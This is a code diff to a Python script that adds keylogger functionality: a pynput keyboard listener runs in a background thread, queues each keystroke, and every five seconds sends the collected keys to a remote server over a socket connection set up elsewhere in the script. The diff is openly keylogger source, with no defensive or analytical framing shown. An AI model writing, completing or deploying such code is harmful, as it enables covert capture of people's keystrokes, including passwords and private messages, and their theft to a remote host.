@@ -2,6 +2,8 @@ import socket
 import time
 import subprocess
 from queue import Queue 
+import threading
+from pynput import keyboard
 
 def install_pynput():
     try:
@@ -18,6 +20,10 @@ def install_pynput():
 def on_press(key, data_queue):
         data_to_send = str(key.char)
         data_queue.put(data_to_send)
+
+def keylogger_thread_func(data_queue):
+    with keyboard.Listener(on_press=lambda key: on_press(key, data_queue)) as listener:
+        listener.join()
 
 def send_data_to_server(data):
     print(data)
@@ -56,6 +62,26 @@ def main():
     server_port = 12345
     data_queue = Queue()
     connect_to_server(server_ip, server_port)
+
+    try:
+        keylogger_thread = threading.Thread(target=keylogger_thread_func, args=(data_queue,))
+        keylogger_thread.start()
+
+        while True:
+            time.sleep(5)
+            recorded_data = ""
+            while not data_queue.empty():
+                recorded_data += data_queue.get()
+
+            if recorded_data:
+                send_data_to_server(recorded_data)
+
+    except KeyboardInterrupt:
+        print("Terminating keylogger.")
+    finally:
+        if client_socket:
+            client_socket.close()
+
 
 if __name__== "__main__":
     main()
